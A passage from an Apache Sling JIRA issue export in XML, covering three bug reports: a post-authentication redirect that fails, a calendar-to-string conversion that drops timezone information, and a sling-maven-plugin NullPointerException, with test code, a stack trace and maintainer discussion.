&lt;p&gt;httpServletResponse.setHeader(&lt;font color=&quot;#6a8759&quot;&gt;&quot;Location&quot;&lt;/font&gt;&lt;font color=&quot;#cc7832&quot;&gt;, &lt;/font&gt;&lt;font color=&quot;#6a8759&quot;&gt;&quot;https://www.google.com&quot;&lt;/font&gt;)&lt;font color=&quot;#cc7832&quot;&gt;;&lt;/font&gt;&lt;/p&gt;

&lt;p&gt;I have also tried&lt;/p&gt;

&lt;p&gt;&lt;font color=&quot;#cc7832&quot;&gt;try &lt;/font&gt;{&lt;br/&gt;
&#160; &#160; httpServletResponse.sendRedirect(&lt;font color=&quot;#6a8759&quot;&gt;&quot;https://www.google.com&quot;&lt;/font&gt;)&lt;font color=&quot;#cc7832&quot;&gt;;&lt;br/&gt;
} catch &lt;/font&gt;(IOException e) &lt;/p&gt;
{
e.printStackTrace();
}

&lt;p&gt;which is also not working.&lt;/p&gt;

&lt;p&gt;Wondering why it seems that sling is blocking the redirect as the client is not being redirected.&lt;/p&gt;</description>
                <environment></environment>
        <key id="13477293">SLING-11547</key>
            <summary>AuthenticationInfoPostProcess redirect failing</summary>
                <type id="1" iconUrl="https://issues.apache.org/jira/secure/viewavatar?size=xsmall&amp;avatarId=21133&amp;avatarType=issuetype">Bug</type>
                                            <priority id="4" iconUrl="https://issues.apache.org/jira/images/icons/priorities/minor.svg">Minor</priority>
                        <status id="1" iconUrl="https://issues.apache.org/jira/images/icons/statuses/open.png" description="The issue is open and ready for the assignee to start work on it.">Open</status>
                    <statusCategory id="2" key="new" colorName="blue-gray"/>
                                    <resolution id="-1">Unresolved</resolution>
                                        <assignee username="-1">Unassigned</assignee>
                                    <reporter username="Tabs">Ben deVries</reporter>
                        <labels>
                    </labels>
                <created>Wed, 17 Aug 2022 19:08:45 +0000</created>
                <updated>Wed, 17 Aug 2022 20:59:12 +0000</updated>
                                                                            <component>Authentication</component>
                        <due></due>
                            <votes>0</votes>
                                    <watches>2</watches>
                                                                                                                <comments>
                            <comment id="17581024" author="enorman" created="Wed, 17 Aug 2022 20:59:12 +0000"  >&lt;p&gt;&lt;a href=&quot;https://issues.apache.org/jira/secure/ViewProfile.jspa?name=Tabs&quot; class=&quot;user-hover&quot; rel=&quot;Tabs&quot;&gt;Tabs&lt;/a&gt; I&apos;m not familiar with the specifics of the SAML authenticator.&#160; What specifically do you see happening?&#160;&lt;/p&gt;

&lt;p&gt;If I&#160; am understanding your description correctly, it sounds like you may be providing a custom service that implements the AuthenticationInfoPostProcessor interface?&#160; If so, then I believe that interface is intended for manipulating the AuthenticationInfo object and I don&apos;t see any mechanism for that component to stop further processing of the request.&#160; So, it may be falling through after your component is called and doing some other redirect to somewhere else?&lt;/p&gt;

&lt;p&gt;Doing something after authentication has succeeded is usually handled by the AuthenticationFeedbackHandler that is usually derived from the AuthenticationHandler implementing that interface and set as an attribute on the AuthenticationInfo object before calling the AuthenticationInfoPostProcessor components.&#160; So I suppose you could replace that attribute in the AuthenicationInfo object with your own AuthenticationFeedbackHandler object?&lt;/p&gt;

&lt;p&gt;&#160;&lt;/p&gt;

&lt;p&gt;It would probably be best if the SAML authenticator provided some configurable means of specifying where to redirect to after the credentials have been verified.&lt;/p&gt;</comment>
                    </comments>
                    <attachments>
                    </attachments>
                <subtasks>
                    </subtasks>
                <customfields>
                                                                            <customfield id="customfield_12310310" key="com.atlassian.jira.toolkit:attachments">
                        <customfieldname>Attachment count</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>0.0</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        <customfield id="customfield_12314020" key="com.atlassian.jira.plugins.jira-development-integration-plugin:devsummary">
                        <customfieldname>Development</customfieldname>
                        <customfieldvalues>
                            
                        </customfieldvalues>
                    </customfield>
                                                                                                                        <customfield id="customfield_12313422" key="com.atlassian.jirafisheyeplugin:jobcheckbox">
                        <customfieldname>Enable Automatic Patch Review</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue><![CDATA[false]]></customfieldvalue>

                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    <customfield id="customfield_12310420" key="com.pyxis.greenhopper.jira:gh-global-rank">
                        <customfieldname>Global Rank</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>9223372036854775807</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                        <customfield id="customfield_12312521" key="com.atlassian.jira.toolkit:LastCommentDate">
                        <customfieldname>Last public comment date</customfieldname>
                        <customfieldvalues>
                            3 years, 10 weeks ago
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                <customfield id="customfield_12311820" key="com.pyxis.greenhopper.jira:gh-lexo-rank">
                        <customfieldname>Rank</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>0|z17u6w:</customfieldvalue>

                        </customfieldvalues>
                    </customfield>
                                                                <customfield id="customfield_12310920" key="com.pyxis.greenhopper.jira:gh-global-rank">
                        <customfieldname>Rank (Obsolete)</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>9223372036854775807</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            </customfields>
    </item>


<item>
            <title>[SLING-11546] ValueMap.get(&quot;calendar&quot;, String.class) conversion loses timezone information</title>
                <link>https://issues.apache.org/jira/browse/SLING-11546</link>
                <project id="12310710" key="SLING">Sling</project>
                    <description>&lt;p&gt;When doing a ValueMap.get(&quot;calendar&quot;, String.class) conversion, before &lt;a href=&quot;https://issues.apache.org/jira/browse/SLING-8116&quot; title=&quot;ValueMap - implement default methods using OSGI Converter&quot; class=&quot;issue-link&quot; data-issue-key=&quot;SLING-8116&quot;&gt;&lt;del&gt;SLING-8116&lt;/del&gt;&lt;/a&gt;,&#160;&lt;/p&gt;

&lt;p&gt;ISO8601.format() was used. Now, Calendar.toInstant().toString() is used. This gives a different result, because the ISO8601 gives the correct timezone, but toInstant() gives the Zulu time.&lt;/p&gt;

&lt;p&gt;toInstant() does the following:&lt;/p&gt;
&lt;blockquote&gt;&lt;p&gt;public final Instant toInstant() { return Instant.ofEpochMilli(getTimeInMillis()); }&lt;/p&gt;&lt;/blockquote&gt;
&lt;p&gt;Timezones and offsets are completely ignored.&lt;/p&gt;</description>
                <environment></environment>
        <key id="13477207">SLING-11546</key>
            <summary>ValueMap.get(&quot;calendar&quot;, String.class) conversion loses timezone information</summary>
                <type id="1" iconUrl="https://issues.apache.org/jira/secure/viewavatar?size=xsmall&amp;avatarId=21133&amp;avatarType=issuetype">Bug</type>
                                            <priority id="3" iconUrl="https://issues.apache.org/jira/images/icons/priorities/major.svg">Major</priority>
                        <status id="6" iconUrl="https://issues.apache.org/jira/images/icons/statuses/closed.png" description="The issue is considered finished, the resolution is correct. Issues which are not closed can be reopened.">Closed</status>
                    <statusCategory id="3" key="done" colorName="green"/>
                                    <resolution id="1">Fixed</resolution>
                                        <assignee username="cziegeler">Carsten Ziegeler</assignee>
                                    <reporter username="JelleBouwmans">Jelle Bouwmans</reporter>
                        <labels>
                    </labels>
                <created>Wed, 17 Aug 2022 09:24:14 +0000</created>
                <updated>Wed, 10 Jul 2024 10:52:36 +0000</updated>
                            <resolved>Wed, 2 Aug 2023 05:12:40 +0000</resolved>
                                    <version>API 2.21.0</version>
                                    <fixVersion>API 2.27.6</fixVersion>
                                    <component>API</component>
                        <due></due>
                            <votes>0</votes>
                                    <watches>4</watches>
                                                    <progress percentage="100">
                                    <originalProgress>
                                                    <row percentage="0" backgroundColor="#89afd7"/>
                                                    <row percentage="100" backgroundColor="transparent"/>
                                            </originalProgress>
                                                    <currentProgress>
                                                    <row percentage="100" backgroundColor="#51a825"/>
                                                    <row percentage="0" backgroundColor="#ec8e00"/>
                                            </currentProgress>
                            </progress>
                                    <aggregateprogress percentage="100">
                                    <originalProgress>
                                                    <row percentage="0" backgroundColor="#89afd7"/>
                                                    <row percentage="100" backgroundColor="transparent"/>
                                            </originalProgress>
                                                    <currentProgress>
                                                    <row percentage="100" backgroundColor="#51a825"/>
                                                    <row percentage="0" backgroundColor="#ec8e00"/>
                                            </currentProgress>
                            </aggregateprogress>
                                            <timeestimate seconds="0">0h</timeestimate>
                            <timespent seconds="1800">0.5h</timespent>
                                <comments>
                            <comment id="17581730" author="joerghoh" created="Fri, 19 Aug 2022 08:45:01 +0000"  >&lt;p&gt;&lt;a href=&quot;https://issues.apache.org/jira/secure/ViewProfile.jspa?name=JelleBouwmans&quot; class=&quot;user-hover&quot; rel=&quot;JelleBouwmans&quot;&gt;JelleBouwmans&lt;/a&gt; can you please provide a failing testcase for this? &lt;/p&gt;</comment>
                            <comment id="17581732" author="jellebouwmans" created="Fri, 19 Aug 2022 08:47:48 +0000"  >&lt;p&gt;&lt;span class=&quot;image-wrap&quot; style=&quot;&quot;&gt;&lt;img src=&quot;https://issues.apache.org/jira/secure/attachment/13048314/13048314_image-2022-08-19-10-41-27-129.png&quot; style=&quot;border: 0px solid black&quot; /&gt;&lt;/span&gt;&lt;/p&gt;

&lt;p&gt;compared to:&lt;/p&gt;

&lt;p&gt;&lt;span class=&quot;image-wrap&quot; style=&quot;&quot;&gt;&lt;img src=&quot;https://issues.apache.org/jira/secure/attachment/13048315/13048315_image-2022-08-19-10-45-25-409.png&quot; style=&quot;border: 0px solid black&quot; /&gt;&lt;/span&gt;&lt;/p&gt;</comment>
                            <comment id="17581752" author="henry kuijpers" created="Fri, 19 Aug 2022 09:52:19 +0000"  >&lt;p&gt;Failing test case here: &lt;br/&gt;
&lt;a href=&quot;https://github.com/henrykuijpers/sling-org-apache-sling-api/commit/c8c82d2a1966e76d493da90355aa296d097bc618&quot; class=&quot;external-link&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener&quot;&gt;https://github.com/henrykuijpers/sling-org-apache-sling-api/commit/c8c82d2a1966e76d493da90355aa296d097bc618&lt;/a&gt;&lt;/p&gt;


&lt;div class=&quot;code panel&quot; style=&quot;border-width: 1px;&quot;&gt;&lt;div class=&quot;codeContent panelContent&quot;&gt;
&lt;pre class=&quot;code-java&quot;&gt;
    @Test
    &lt;span class=&quot;code-keyword&quot;&gt;public&lt;/span&gt; void testCalendarWithTimeZone() &lt;span class=&quot;code-keyword&quot;&gt;throws&lt;/span&gt; Exception {
        &lt;span class=&quot;code-keyword&quot;&gt;final&lt;/span&gt; Calendar calendar = Calendar.getInstance(TimeZone.getTimeZone(&lt;span class=&quot;code-quote&quot;&gt;&quot;GMT+2&quot;&lt;/span&gt;));
        calendar.set(2022, Calendar.AUGUST, 19, 11, 46, 0);
        calendar.set(Calendar.MILLISECOND, 0);
        assertEquals(&lt;span class=&quot;code-quote&quot;&gt;&quot;2022-08-19T11:46:00.000+02:00&quot;&lt;/span&gt;, ObjectConverter.convert(calendar, &lt;span class=&quot;code-object&quot;&gt;String&lt;/span&gt;.class));
    }
&lt;/pre&gt;
&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Gives:&lt;/p&gt;
&lt;div class=&quot;code panel&quot; style=&quot;border-width: 1px;&quot;&gt;&lt;div class=&quot;codeContent panelContent&quot;&gt;
&lt;pre class=&quot;code-java&quot;&gt;
org.junit.ComparisonFailure: 
Expected :2022-08-19T11:46:00.000+02:00
Actual   :2022-08-19T09:46:00Z
&lt;/pre&gt;
&lt;/div&gt;&lt;/div&gt;</comment>
                            <comment id="17581767" author="henry kuijpers" created="Fri, 19 Aug 2022 10:35:34 +0000"  >&lt;p&gt;It looks like &lt;/p&gt;

&lt;div class=&quot;code panel&quot; style=&quot;border-width: 1px;&quot;&gt;&lt;div class=&quot;codeContent panelContent&quot;&gt;
&lt;pre class=&quot;code-java&quot;&gt;
&lt;span class=&quot;code-keyword&quot;&gt;return&lt;/span&gt; ZonedDateTime.ofInstant(Instant.ofEpochMilli(calendar.getTimeInMillis()), calendar.getTimeZone().toZoneId()).format(DateTimeFormatter.ISO_OFFSET_DATE_TIME);
&lt;/pre&gt;
&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;does give the expected results (taking into account the timezone).&lt;/p&gt;

&lt;p&gt;However, are there situations where the timezone will not be available? &lt;/p&gt;</comment>
                            <comment id="17581808" author="joerghoh" created="Fri, 19 Aug 2022 11:59:05 +0000"  >&lt;p&gt;&lt;a href=&quot;https://issues.apache.org/jira/secure/ViewProfile.jspa?name=Henry+Kuijpers&quot; class=&quot;user-hover&quot; rel=&quot;Henry Kuijpers&quot;&gt;Henry Kuijpers&lt;/a&gt; a calendar always has a timezone information, so I think that the your suggestion would always work.&lt;/p&gt;</comment>
                            <comment id="17711199" author="cziegeler" created="Wed, 12 Apr 2023 05:40:13 +0000"  >&lt;p&gt;&lt;a href=&quot;https://issues.apache.org/jira/secure/ViewProfile.jspa?name=Henry+Kuijpers&quot; class=&quot;user-hover&quot; rel=&quot;Henry Kuijpers&quot;&gt;Henry Kuijpers&lt;/a&gt;&#160; Could you maybe please provide a PR with the fix and the test?&lt;/p&gt;</comment>
                            <comment id="17742732" author="henry kuijpers" created="Thu, 13 Jul 2023 09:31:55 +0000"  >&lt;p&gt;&lt;a href=&quot;https://issues.apache.org/jira/secure/ViewProfile.jspa?name=cziegeler&quot; class=&quot;user-hover&quot; rel=&quot;cziegeler&quot;&gt;cziegeler&lt;/a&gt; &lt;a href=&quot;https://issues.apache.org/jira/secure/ViewProfile.jspa?name=joerghoh&quot; class=&quot;user-hover&quot; rel=&quot;joerghoh&quot;&gt;joerghoh&lt;/a&gt; A PR was created by my colleague: &lt;a href=&quot;https://github.com/apache/sling-org-apache-sling-api/pull/49&quot; class=&quot;external-link&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener&quot;&gt;https://github.com/apache/sling-org-apache-sling-api/pull/49&lt;/a&gt; Is it ready to be merged? &lt;img class=&quot;emoticon&quot; src=&quot;https://issues.apache.org/jira/images/icons/emoticons/smile.png&quot; height=&quot;16&quot; width=&quot;16&quot; align=&quot;absmiddle&quot; alt=&quot;&quot; border=&quot;0&quot;/&gt;&lt;/p&gt;</comment>
                    </comments>
                    <attachments>
                            <attachment id="13048314" name="image-2022-08-19-10-41-27-129.png" size="157352" author="JelleBouwmans" created="Fri, 19 Aug 2022 08:41:27 +0000"/>
                            <attachment id="13048315" name="image-2022-08-19-10-45-25-409.png" size="140404" author="JelleBouwmans" created="Fri, 19 Aug 2022 08:45:26 +0000"/>
                    </attachments>
                <subtasks>
                    </subtasks>
                <customfields>
                                                                            <customfield id="customfield_12310310" key="com.atlassian.jira.toolkit:attachments">
                        <customfieldname>Attachment count</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>2.0</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        <customfield id="customfield_12314020" key="com.atlassian.jira.plugins.jira-development-integration-plugin:devsummary">
                        <customfieldname>Development</customfieldname>
                        <customfieldvalues>
                            
                        </customfieldvalues>
                    </customfield>
                                                                                                                        <customfield id="customfield_12313422" key="com.atlassian.jirafisheyeplugin:jobcheckbox">
                        <customfieldname>Enable Automatic Patch Review</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue><![CDATA[false]]></customfieldvalue>

                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    <customfield id="customfield_12310420" key="com.pyxis.greenhopper.jira:gh-global-rank">
                        <customfieldname>Global Rank</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>9223372036854775807</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                        <customfield id="customfield_12312521" key="com.atlassian.jira.toolkit:LastCommentDate">
                        <customfieldname>Last public comment date</customfieldname>
                        <customfieldvalues>
                            2 years, 15 weeks ago
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                <customfield id="customfield_12311820" key="com.pyxis.greenhopper.jira:gh-lexo-rank">
                        <customfieldname>Rank</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>0|z17to8:</customfieldvalue>

                        </customfieldvalues>
                    </customfield>
                                                                <customfield id="customfield_12310920" key="com.pyxis.greenhopper.jira:gh-global-rank">
                        <customfieldname>Rank (Obsolete)</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>9223372036854775807</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            </customfields>
    </item>


<item>
            <title>[SLING-11543] sling-maven-plugin: Install goal fails if executed alone</title>
                <link>https://issues.apache.org/jira/browse/SLING-11543</link>
                <project id="12310710" key="SLING">Sling</project>
                    <description>&lt;p&gt;doing a bundle install using &lt;tt&gt;mvn clean install sling:install&lt;/tt&gt; works fine, however calling &lt;tt&gt;mvn sling:install&lt;/tt&gt; directly fails with an NPE for me:&lt;/p&gt;
&lt;div class=&quot;preformatted panel&quot; style=&quot;border-width: 1px;&quot;&gt;&lt;div class=&quot;preformattedContent panelContent&quot;&gt;
&lt;pre&gt;[ERROR] Failed to execute goal org.apache.sling:sling-maven-plugin:3.0.1-SNAPSHOT:install (default-cli) on project de.provision.website.adaptto.core: Execution default-cli of goal org.apache.sling:sling-maven-plugin:3.0.1-SNAPSHOT:install failed.: NullPointerException -&amp;gt; [Help 1]
org.apache.maven.lifecycle.LifecycleExecutionException: Failed to execute goal org.apache.sling:sling-maven-plugin:3.0.1-SNAPSHOT:install (default-cli) on project de.provision.website.adaptto.core: Execution default-cli of goal org.apache.sling:sling-maven-plugin:3.0.1-SNAPSHOT:install failed.
&#160; &#160; at org.apache.maven.lifecycle.internal.MojoExecutor.execute (MojoExecutor.java:215)
&#160; &#160; at org.apache.maven.lifecycle.internal.MojoExecutor.execute (MojoExecutor.java:156)
&#160; &#160; at org.apache.maven.lifecycle.internal.MojoExecutor.execute (MojoExecutor.java:148)
&#160; &#160; at org.apache.maven.lifecycle.internal.LifecycleModuleBuilder.buildProject (LifecycleModuleBuilder.java:117)
&#160; &#160; at org.apache.maven.lifecycle.internal.LifecycleModuleBuilder.buildProject (LifecycleModuleBuilder.java:81)
&#160; &#160; at org.apache.maven.lifecycle.internal.builder.singlethreaded.SingleThreadedBuilder.build (SingleThreadedBuilder.java:56)
&#160; &#160; at org.apache.maven.lifecycle.internal.LifecycleStarter.execute (LifecycleStarter.java:128)
&#160; &#160; at org.apache.maven.DefaultMaven.doExecute (DefaultMaven.java:305)
&#160; &#160; at org.apache.maven.DefaultMaven.doExecute (DefaultMaven.java:192)
&#160; &#160; at org.apache.maven.DefaultMaven.execute (DefaultMaven.java:105)
&#160; &#160; at org.apache.maven.cli.MavenCli.execute (MavenCli.java:972)
&#160; &#160; at org.apache.maven.cli.MavenCli.doMain (MavenCli.java:293)
&#160; &#160; at org.apache.maven.cli.MavenCli.main (MavenCli.java:196)
&#160; &#160; at jdk.internal.reflect.NativeMethodAccessorImpl.invoke0 (Native Method)
&#160; &#160; at jdk.internal.reflect.NativeMethodAccessorImpl.invoke (NativeMethodAccessorImpl.java:62)
&#160; &#160; at jdk.internal.reflect.DelegatingMethodAccessorImpl.invoke (DelegatingMethodAccessorImpl.java:43)
&#160; &#160; at java.lang.reflect.Method.invoke (Method.java:566)
&#160; &#160; at org.codehaus.plexus.classworlds.launcher.Launcher.launchEnhanced (Launcher.java:282)
&#160; &#160; at org.codehaus.plexus.classworlds.launcher.Launcher.launch (Launcher.java:225)
&#160; &#160; at org.codehaus.plexus.classworlds.launcher.Launcher.mainWithExitCode (Launcher.java:406)
&#160; &#160; at org.codehaus.plexus.classworlds.launcher.Launcher.main (Launcher.java:347)
Caused by: org.apache.maven.plugin.PluginExecutionException: Execution default-cli of goal org.apache.sling:sling-maven-plugin:3.0.1-SNAPSHOT:install failed.
&#160; &#160; at org.apache.maven.plugin.DefaultBuildPluginManager.executeMojo (DefaultBuildPluginManager.java:148)
&#160; &#160; at org.apache.maven.lifecycle.internal.MojoExecutor.execute (MojoExecutor.java:210)
&#160; &#160; at org.apache.maven.lifecycle.internal.MojoExecutor.execute (MojoExecutor.java:156)
&#160; &#160; at org.apache.maven.lifecycle.internal.MojoExecutor.execute (MojoExecutor.java:148)
&#160; &#160; at org.apache.maven.lifecycle.internal.LifecycleModuleBuilder.buildProject (LifecycleModuleBuilder.java:117)
&#160; &#160; at org.apache.maven.lifecycle.internal.LifecycleModuleBuilder.buildProject (LifecycleModuleBuilder.java:81)
&#160; &#160; at org.apache.maven.lifecycle.internal.builder.singlethreaded.SingleThreadedBuilder.build (SingleThreadedBuilder.java:56)
&#160; &#160; at org.apache.maven.lifecycle.internal.LifecycleStarter.execute (LifecycleStarter.java:128)
&#160; &#160; at org.apache.maven.DefaultMaven.doExecute (DefaultMaven.java:305)
&#160; &#160; at org.apache.maven.DefaultMaven.doExecute (DefaultMaven.java:192)
&#160; &#160; at org.apache.maven.DefaultMaven.execute (DefaultMaven.java:105)
&#160; &#160; at org.apache.maven.cli.MavenCli.execute (MavenCli.java:972)
&#160; &#160; at org.apache.maven.cli.MavenCli.doMain (MavenCli.java:293)
&#160; &#160; at org.apache.maven.cli.MavenCli.main (MavenCli.java:196)
&#160; &#160; at jdk.internal.reflect.NativeMethodAccessorImpl.invoke0 (Native Method)
&#160; &#160; at jdk.internal.reflect.NativeMethodAccessorImpl.invoke (NativeMethodAccessorImpl.java:62)
&#160; &#160; at jdk.internal.reflect.DelegatingMethodAccessorImpl.invoke (DelegatingMethodAccessorImpl.java:43)
&#160; &#160; at java.lang.reflect.Method.invoke (Method.java:566)
&#160; &#160; at org.codehaus.plexus.classworlds.launcher.Launcher.launchEnhanced (Launcher.java:282)
&#160; &#160; at org.codehaus.plexus.classworlds.launcher.Launcher.launch (Launcher.java:225)
&#160; &#160; at org.codehaus.plexus.classworlds.launcher.Launcher.mainWithExitCode (Launcher.java:406)
&#160; &#160; at org.codehaus.plexus.classworlds.launcher.Launcher.main (Launcher.java:347)
Caused by: java.lang.NullPointerException
&#160; &#160; at org.apache.sling.maven.bundlesupport.AbstractBundleInstallMojo.execute (AbstractBundleInstallMojo.java:123)
&#160; &#160; at org.apache.sling.maven.bundlesupport.BundleInstallMojo.execute (BundleInstallMojo.java:52)
&#160; &#160; at org.apache.maven.plugin.DefaultBuildPluginManager.executeMojo (DefaultBuildPluginManager.java:137)
&#160; &#160; at org.apache.maven.lifecycle.internal.MojoExecutor.execute (MojoExecutor.java:210)
&#160; &#160; at org.apache.maven.lifecycle.internal.MojoExecutor.execute (MojoExecutor.java:156)
&#160; &#160; at org.apache.maven.lifecycle.internal.MojoExecutor.execute (MojoExecutor.java:148)
&#160; &#160; at org.apache.maven.lifecycle.internal.LifecycleModuleBuilder.buildProject (LifecycleModuleBuilder.java:117)
&#160; &#160; at org.apache.maven.lifecycle.internal.LifecycleModuleBuilder.buildProject (LifecycleModuleBuilder.java:81)
&#160; &#160; at org.apache.maven.lifecycle.internal.builder.singlethreaded.SingleThreadedBuilder.build (SingleThreadedBuilder.java:56)
&#160; &#160; at org.apache.maven.lifecycle.internal.LifecycleStarter.execute (LifecycleStarter.java:128)
&#160; &#160; at org.apache.maven.DefaultMaven.doExecute (DefaultMaven.java:305)
&#160; &#160; at org.apache.maven.DefaultMaven.doExecute (DefaultMaven.java:192)
&#160; &#160; at org.apache.maven.DefaultMaven.execute (DefaultMaven.java:105)
&#160; &#160; at org.apache.maven.cli.MavenCli.execute (MavenCli.java:972)
&#160; &#160; at org.apache.maven.cli.MavenCli.doMain (MavenCli.java:293)
&#160; &#160; at org.apache.maven.cli.MavenCli.main (MavenCli.java:196)
&#160; &#160; at jdk.internal.reflect.NativeMethodAccessorImpl.invoke0 (Native Method)
&#160; &#160; at jdk.internal.reflect.NativeMethodAccessorImpl.invoke (NativeMethodAccessorImpl.java:62)
&#160; &#160; at jdk.internal.reflect.DelegatingMethodAccessorImpl.invoke (DelegatingMethodAccessorImpl.java:43)
&#160; &#160; at java.lang.reflect.Method.invoke (Method.java:566)
&#160; &#160; at org.codehaus.plexus.classworlds.launcher.Launcher.launchEnhanced (Launcher.java:282)
&#160; &#160; at org.codehaus.plexus.classworlds.launcher.Launcher.launch (Launcher.java:225)
&#160; &#160; at org.codehaus.plexus.classworlds.launcher.Launcher.mainWithExitCode (Launcher.java:406)
&#160; &#160; at org.codehaus.plexus.classworlds.launcher.Launcher.main (Launcher.java:347)
 &lt;/pre&gt;
&lt;/div&gt;&lt;/div&gt;</description>
                <environment></environment>
        <key id="13476845">SLING-11543</key>
            <summary>sling-maven-plugin: Install goal fails if executed alone</summary>
                <type id="1" iconUrl="https://issues.apache.org/jira/secure/viewavatar?size=xsmall&amp;avatarId=21133&amp;avatarType=issuetype">Bug</type>
                                            <priority id="3" iconUrl="https://issues.apache.org/jira/images/icons/priorities/major.svg">Major</priority>
                        <status id="6" iconUrl="https://issues.apache.org/jira/images/icons/statuses/closed.png" description="The issue is considered finished, the resolution is correct. Issues which are not closed can be reopened.">Closed</status>
                    <statusCategory id="3" key="done" colorName="green"/>
                                    <resolution id="1">Fixed</resolution>
                                        <assignee username="kwin">Konrad Windszus</assignee>
                                    <reporter username="sseifert">Stefan Seifert</reporter>
                        <labels>
                    </labels>
                <created>Mon, 15 Aug 2022 14:22:59 +0000</created>
                <updated>Sun, 21 Aug 2022 09:14:06 +0000</updated>
                            <resolved>Tue, 16 Aug 2022 13:07:36 +0000</resolved>
                                                    <fixVersion>Sling Maven Plugin 3.0.2</fixVersion>
                                    <component>Maven Plugins and Archetypes</component>
                        <due></due>
                            <votes>0</votes>
                                    <watches>2</watches>
                                                    <progress percentage="100">
                                    <originalProgress>
                                                    <row percentage="0" backgroundColor="#89afd7"/>
                                                    <row percentage="100" backgroundColor="transparent"/>
                                            </originalProgress>
                                                    <currentProgress>
                                                    <row percentage="100" backgroundColor="#51a825"/>
                                                    <row percentage="0" backgroundColor="#ec8e00"/>
                                            </currentProgress>
                            </progress>
                                    <aggregateprogress percentage="100">
                                    <originalProgress>
                                                    <row percentage="0" backgroundColor="#89afd7"/>
                                                    <row percentage="100" backgroundColor="transparent"/>
                                            </originalProgress>
                                                    <currentProgress>
                                                    <row percentage="100" backgroundColor="#51a825"/>
                                                    <row percentage="0" backgroundColor="#ec8e00"/>
                                            </currentProgress>
                            </aggregateprogress>
                                            <timeestimate seconds="0">0h</timeestimate>
                            <timespent seconds="3000">50m</timespent>
                                <comments>
                            <comment id="17579808" author="kwin" created="Mon, 15 Aug 2022 16:47:37 +0000"  >&lt;p&gt;For me calling &lt;tt&gt;sling:install&lt;/tt&gt; standalone is wrong. Similar to &lt;tt&gt;install:install&lt;/tt&gt; it must fail (as calling it standalone leads to no artifact being attached), although granted there must be a better exception message instead of the NPE. You must use the goal &lt;tt&gt;sling:install-file&lt;/tt&gt; for standalone usage. &lt;a href=&quot;https://issues.apache.org/jira/secure/ViewProfile.jspa?name=sseifert&quot; class=&quot;user-hover&quot; rel=&quot;sseifert&quot;&gt;sseifert&lt;/a&gt; WDYT?&lt;/p&gt;</comment>
                            <comment id="17579836" author="sseifert@pro-vision.de" created="Mon, 15 Aug 2022 18:01:13 +0000"  >&lt;p&gt;it worked with previous versions of the plugin, for years: if the JAR file was already present from a previous build it was picked up and deployed. using install-file goal requires additional parameters and is counter-intuitive if called on a bundle project POM.&lt;/p&gt;

&lt;p&gt;i you think it should be a no-go to do this and worth breaking this behavior it&apos;s fine, we should indeed then generate a quite precise error message.&lt;/p&gt;</comment>
                            <comment id="17579859" author="kwin" created="Mon, 15 Aug 2022 18:45:08 +0000"  >&lt;p&gt;&lt;a href=&quot;https://issues.apache.org/jira/secure/ViewProfile.jspa?name=sseifert&quot; class=&quot;user-hover&quot; rel=&quot;sseifert&quot;&gt;sseifert&lt;/a&gt; Can you review the attached PR?&lt;/p&gt;</comment>
                            <comment id="17580103" author="kwin" created="Tue, 16 Aug 2022 07:30:09 +0000"  >&lt;blockquote&gt;&lt;p&gt;using install-file goal requires additional parameters&lt;/p&gt;&lt;/blockquote&gt;
&lt;p&gt;I changed this now for &lt;tt&gt;install-file&lt;/tt&gt; in the attached PR so that it falls back to the default target path&lt;/p&gt;
&lt;blockquote&gt;&lt;p&gt;and is counter-intuitive if called on a bundle project POM.&lt;/p&gt;&lt;/blockquote&gt;
&lt;p&gt;that is rather subjective, as maven-install-plugin works like this forever...&lt;/p&gt;</comment>
                            <comment id="17580283" author="sseifert@pro-vision.de" created="Tue, 16 Aug 2022 11:59:06 +0000"  >&lt;p&gt;lgtm, thanks&lt;/p&gt;</comment>
                            <comment id="17580308" author="kwin" created="Tue, 16 Aug 2022 13:07:36 +0000"  >&lt;p&gt;Fixed in &lt;a href=&quot;https://github.com/apache/sling-maven-plugin/commit/dc72d15de408ea1a48b8aee1de3bdaad73787167&quot; class=&quot;external-link&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener&quot;&gt;https://github.com/apache/sling-maven-plugin/commit/dc72d15de408ea1a48b8aee1de3bdaad73787167&lt;/a&gt;.&lt;/p&gt;</comment>
                    </comments>
                <issuelinks>
                            <issuelinktype id="12310050">
                    <name>Regression</name>
                                                                <inwardlinks description="is broken by">
                                        <issuelink>
            <issuekey id="13476022">SLING-11524</issuekey>
        </issuelink>
                            </inwardlinks>
                                    </issuelinktype>
                    </issuelinks>
                <attachments>
                    </attachments>
                <subtasks>
                    </subtasks>
                <customfields>
                                                                            <customfield id="customfield_12310310" key="com.atlassian.jira.toolkit:attachments">
                        <customfieldname>Attachment count</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>0.0</customfieldvalue>
